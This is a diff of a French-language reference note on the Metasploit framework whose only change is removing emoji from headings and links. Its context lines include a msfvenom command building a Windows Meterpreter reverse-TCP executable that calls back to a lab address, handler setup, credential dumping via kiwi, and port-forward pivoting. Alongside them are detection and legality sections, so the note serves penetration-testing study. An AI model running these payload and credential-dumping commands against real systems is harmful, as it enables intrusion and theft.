@@ -1,11 +1,11 @@
 ---
 title: "Outil - Metasploit"
 type: outil
-categorie: 🕹️ C2 & Post-Exploitation
+categorie: C2 & Post-Exploitation
 tags:
   - cyber
   - outil
-  - 🕹️ C2 & Post-Exploitation
+  - C2 & Post-Exploitation
 statut: publie
 version: 6.5
 licence: BSD-3-Clause (framework open source)
@@ -17,19 +17,19 @@ doc: https://docs.metasploit.com
 ---
 
 
-# 🕹️ Metasploit — Framework d'exploitation et post-exploitation
+# Metasploit — Framework d'exploitation et post-exploitation
 
 > [!info] **En 1 phrase**
 > Metasploit Framework est le framework d'exploitation open-source le plus utilisé : recherche de modules, génération de payloads avec `msfvenom`, exploitation et post-exploitation via Meterpreter.
 
 ---
 
-## 🧾 Overview
+## Overview
 
 | Champ | Valeur |
 |---|---|
 | Description | Framework d'exploitation et de post-exploitation : modules exploit/auxiliary/payload/post, console `msfconsole`, `msfvenom`, sessions Meterpreter |
-| Catégorie | 🕹️ C2 & Post-Exploitation |
+| Catégorie | C2 & Post-Exploitation |
 | Type d'outil | Framework (CLI `msfconsole`, GUI commerciale Metasploit Pro) |
 | Licence | BSD-3-Clause (framework) ; éditions Community/Express/Pro propriétaires |
 | Langage(s) | Ruby (~95 %), C, Assembly, PowerShell, Python |
@@ -46,7 +46,7 @@ doc: https://docs.metasploit.com
 
 ---
 
-## 🎯 Concept
+## Concept
 
 Metasploit automatise l'exploitation d'une vulnérabilité de la phase « scanner » jusqu'à la prise de contrôle. Il centralise des milliers de modules `exploit/`, `auxiliary/`, `payload/` et `post/`, pilotés depuis `msfconsole`. On l'utilise quand une vulnérabilité est identifiée (CVE, port exposé, service faible) et qu'on veut un payload fiable (Meterpreter, shell, reverse HTTPS) ou une session de post-exploitation. Il couvre tout le cycle : **scan** (`auxiliary/scanner/*`, `db_nmap`), **exploitation**, **payloads** (`msfvenom`), **post-exploitation** (Meterpreter), **pivoting** (`route`, `portfwd`) et **persistance**. La base PostgreSQL (`msfdb init`) corrèle hôtes, vulnérabilités et sessions. Historique : créé par H. D. Moore en 2003 (11 exploits en Perl), réécrit en Ruby en 2007 (v3.0), racheté par Rapid7 en 2009 ; référencé dans MITRE ATT&CK (T1588.002) par de nombreux acteurs (APT, CopyKittens, Magic Hound).
 
@@ -62,7 +62,7 @@ flowchart LR
 
 ---
 
-## 🧠 Concepts fondamentaux
+## Concepts fondamentaux
 
 | Concept | Explication |
 |---|---|
@@ -81,7 +81,7 @@ flowchart LR
 
 ---
 
-## 🛠️ Installation
+## Installation
 
 ```bash
 # Debian/Ubuntu/Kali · Arch (AUR) · macOS
@@ -104,13 +104,13 @@ msfdb init
 msfconsole -q -x "version; exit"
 ```
 
-> [!warning] ⚠️ Prérequis
+> [!warning] Prérequis
 > - Ruby >= 3.x et Bundler requis pour la compilation. `msfdb init` au moins une fois pour `db_nmap`/`vulns` (sinon `sudo systemctl status postgresql`).
 > - Mises à jour : `msfupdate` ou `git pull && bundle install`. Un antivirus peut bloquer la génération de payloads : tester en lab isolé.
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 Répertoire de configuration : `~/.msf4/` (Linux/macOS), `%USERPROFILE%\.msf4\` (Windows).
 
@@ -128,7 +128,7 @@ Répertoire de configuration : `~/.msf4/` (Linux/macOS), `%USERPROFILE%\.msf4\` 
 
 ---
 
-## 🏗️ Architecture interne
+## Architecture interne
 
 - **Msf::Framework** : cœur, charge les modules depuis `modules/`.
 - **msfconsole** : interface interactive (Readline), historique, resource scripts.
@@ -143,7 +143,7 @@ Flux d'exécution : `use` → `check` → `exploit` → génération du payload 
 
 ---
 
-## ⌨️ Commandes
+## Commandes
 
 | Commande | Effet |
 |---|---|
@@ -180,7 +180,7 @@ run post/multi/recon/local_exploit_suggester; load kiwi
 
 ---
 
-## 🎚️ Options et flags
+## Options et flags
 
 | Outil | Option | Description |
 |---|---|---|
@@ -205,7 +205,7 @@ run post/multi/recon/local_exploit_suggester; load kiwi
 
 ---
 
-## 🧪 Exemples pratiques
+## Exemples pratiques
 
 ### Advanced — Pass-the-Hash avec psexec
 
@@ -232,7 +232,7 @@ run
 
 ---
 
-## 🧪 Workflow complet (scénario pas à pas)
+## Workflow complet (scénario pas à pas)
 
 1. **Préparer l'écouteur** — `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set LHOST 10.10.14.5`, `set LPORT 4444`, `run -j`.
 2. **Générer le payload** : `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe`.
@@ -243,7 +243,7 @@ run
 
 ---
 
-## 🎬 Scénarios avancés
+## Scénarios avancés
 
 ### Scénario 1 : Automatisation via resource script (handler)
 
@@ -271,7 +271,7 @@ run
 
 ---
 
-## 🛡️ Cybersecurity use cases
+## Cybersecurity use cases
 
 | Phase | Utilisation |
 |---|---|
@@ -285,7 +285,7 @@ run
 
 ---
 
-## 🎯 MITRE ATT&CK
+## MITRE ATT&CK
 
 | Tactique | Technique / Sub-technique | ID | Détection | Mitigation |
 |---|---|---|---|---|
@@ -307,7 +307,7 @@ run
 
 ---
 
-## 🛡️ Defensive Security
+## Defensive Security
 
 ### Signes observables
 
@@ -376,7 +376,7 @@ level: high
 
 ---
 
-## 🤖 Automatisation
+## Automatisation
 
 ```bash
 # Bash — lancement d'un handler (handler.sh)
@@ -396,7 +396,7 @@ print(json.dumps(requests.post('http://127.0.0.1:55552/api/', json={
 
 ---
 
-## 📤 Output et parsing
+## Output et parsing
 
 Les résultats sont stockés dans la base PostgreSQL : `hosts`, `services`, `vulns`, `creds`, `loot`.
 
@@ -409,9 +409,9 @@ sudo -u postgres psql -d msf -c "SELECT host, port, name FROM services WHERE nam
 
 ---
 
-## 🔗 Intégrations
+## Intégrations
 
-- [[Tools|🧰 Outils]] global
+- [[Tools| Outils]] global
 - [[Outil - Nmap]] — `db_nmap` alimente la base de données
 - [[Outil - Impacket]] — psexec.py/wmiexec.py équivalents hors framework
 - [[Outil - Mimikatz]] — dump de credentials (chargé via `load kiwi`)
@@ -419,11 +419,11 @@ sudo -u postgres psql -d msf -c "SELECT host, port, name FROM services WHERE nam
 - [[Outil - SearchSploit]] — recherche d'exploits avant le module
 - [[Outil - Ligolo-ng]] / [[Outil - Chisel]] — tunneling et pivoting
 - [[Outil - Covenant]] / [[Outil - Sliver]] — frameworks C2 alternatifs
-- [[Techniques/Reverse Shells|🐚 Reverse Shells]] · [[Techniques/Pivoting et Tunneling|🌉 Pivoting]] · [[Techniques/CVE Exploits|🐛 CVE Exploits]]
+- [[Techniques/Reverse Shells| Reverse Shells]] · [[Techniques/Pivoting et Tunneling| Pivoting]] · [[Techniques/CVE Exploits| CVE Exploits]]
 
 ---
 
-## 🔄 Alternatives
+## Alternatives
 
 | Outil | Avantages | Inconvénients | Cas d'usage |
 |---|---|---|---|
@@ -436,7 +436,7 @@ sudo -u postgres psql -d msf -c "SELECT host, port, name FROM services WHERE nam
 
 ---
 
-## ⚡ Performance
+## Performance
 
 - Pas conçu pour la vitesse de scan : préférer Nmap/Masscan et importer via `db_nmap`.
 - Le démarrage de `msfconsole` prend quelques secondes (modules + BDD) ; `-q` enlève la bannière mais pas ce coût.
@@ -445,7 +445,7 @@ sudo -u postgres psql -d msf -c "SELECT host, port, name FROM services WHERE nam
 
 ---
 
-## 🛠️ Troubleshooting
+## Troubleshooting
 
 #### Problème : `msfdb init` échoue ou la BDD n'est pas connectée
 
@@ -474,7 +474,7 @@ sudo -u postgres psql -d msf -c "SELECT host, port, name FROM services WHERE nam
 
 ---
 
-## 🔐 Sécurité de l'outil- **Légalité** : Metasploit est dual-use ; son usage hors périmètre autorisé est illégal. Toujours faire signer un cadre d'intervention.
+## Sécurité de l'outil- **Légalité** : Metasploit est dual-use ; son usage hors périmètre autorisé est illégal. Toujours faire signer un cadre d'intervention.
 - **Bruit** : les exploits Metasploit sont connus des signatures IDS/AV ; en red team, privilégier payloads personnalisés et ports 80/443.
 - **Télémétrie** : le framework open source n'envoie pas de télémétrie obligatoire ; les éditions Pro/Community en collectent davantage.
 - **msfrpc** : exposer ce plugin sans authentification forte est une backdoor totale — restreindre à loopback et mot de passe fort.
@@ -483,7 +483,7 @@ sudo -u postgres psql -d msf -c "SELECT host, port, name FROM services WHERE nam
 
 ---
 
-## ⚠️ Limitations
+## Limitations
 
 - La **vitesse de scan** est médiocre : utiliser Nmap/Masscan en amont.
 - Un **module peut échouer** sur une version légèrement différente ; `check` n'existe pas pour tous.
@@ -495,7 +495,7 @@ sudo -u postgres psql -d msf -c "SELECT host, port, name FROM services WHERE nam
 
 ---
 
-## 📋 Cheatsheet
+## Cheatsheet
 
 ```bash
 # Console + handler
@@ -528,7 +528,7 @@ portfwd add -L 127.0.0.1 -p 8080 -r 172.16.5.10 -P 80
 
 ---
 
-## ⚡ Quick reference
+## Quick reference
 
 | | |
 |---|---|
@@ -541,7 +541,7 @@ portfwd add -L 127.0.0.1 -p 8080 -r 172.16.5.10 -P 80
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Signe | Défense |
 |---|---|
@@ -556,15 +556,15 @@ portfwd add -L 127.0.0.1 -p 8080 -r 172.16.5.10 -P 80
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Tips**
+> [!tip] **Tips**
 > - Toujours `msfdb init` au premier lancement ; `setg` pour ne pas répéter LHOST/LPORT.
 > - `run -j -z` lance un handler en tâche de fond sans bloquer la console.
 > - `sessions -u <id>` upgrade un shell en Meterpreter.
 > - Isoler chaque engagement dans un `workspace` (`workspace -a HTB-box`).
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - Un payload non obfusqué est détecté immédiatement par Defender/EDR : tester en lab, préférer 443/80 à 4444.
 > - `LHOST` doit être l'IP **joignable** par la cible (tunnel VPN), pas localhost.
 > - Ne jamais exposer `msfrpc` sans authentification : backdoor totale.
@@ -573,7 +573,7 @@ portfwd add -L 127.0.0.1 -p 8080 -r 172.16.5.10 -P 80
 
 ---
 
-## 📚 References
+## References
 
 ### Official
 
@@ -597,4 +597,4 @@ portfwd add -L 127.0.0.1 -p 8080 -r 172.16.5.10 -P 80
 
 ---
 
-➡️ **Liens :** [[Tools|🧰 Outils]] · [[Techniques/Reverse Shells|🐚 Reverse Shells]] · [[Techniques/Pivoting et Tunneling|🌉 Pivoting]] · [[Techniques/CVE Exploits|🐛 CVE Exploits]]
+**Liens :** [[Tools| Outils]] · [[Techniques/Reverse Shells| Reverse Shells]] · [[Techniques/Pivoting et Tunneling| Pivoting]] · [[Techniques/CVE Exploits| CVE Exploits]]
